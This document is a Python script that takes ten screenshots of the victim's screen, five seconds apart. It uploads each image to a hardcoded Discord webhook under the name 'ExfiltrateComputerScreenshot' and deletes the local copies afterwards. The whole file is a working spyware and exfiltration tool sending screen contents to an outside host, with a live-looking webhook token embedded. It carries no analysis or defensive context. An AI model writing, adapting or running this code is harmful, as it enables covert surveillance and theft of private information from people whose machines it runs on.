import pyautogui
from time import sleep
import requests
import os

# Your Discord webhook URL
discord_webhook = "https://discord.com/api/webhooks/1308603405261869136/4R4IbRO5Afo8oQuEG-Tk5xPtOS3VzinsjtQPyU8aMNSKcdHvP0f1XcHZBSfwBXaNv__P"

# Variables
SCREENSHOTS = 10  # Number of screenshots
TIMING = 5        # Time interval between screenshots (seconds)

# Loop to capture and send screenshots
for i in range(SCREENSHOTS):
    sleep(TIMING)
    
    # Take the screenshot
    screenshot_file = f"screenshot_{i}.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_file)
    
    # Read the screenshot file
    with open(screenshot_file, "rb") as f:
        file_data = f.read()
    
    # Prepare the payload for Discord
    payload = {
        "username": "ExfiltrateComputerScreenshot",
    }
    files = {
        f"Screen_{i}.png": file_data
    }
    
    # Send the screenshot to Discord
    try:
        response = requests.post(discord_webhook, data=payload, files=files)
        if response.status_code == 204:
            print(f"Screenshot {i + 1} sent successfully.")
        else:
            print(f"Failed to send screenshot {i + 1}. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending screenshot {i + 1}: {e}")
    
    # Cleanup the local screenshot file
    os.remove(screenshot_file)
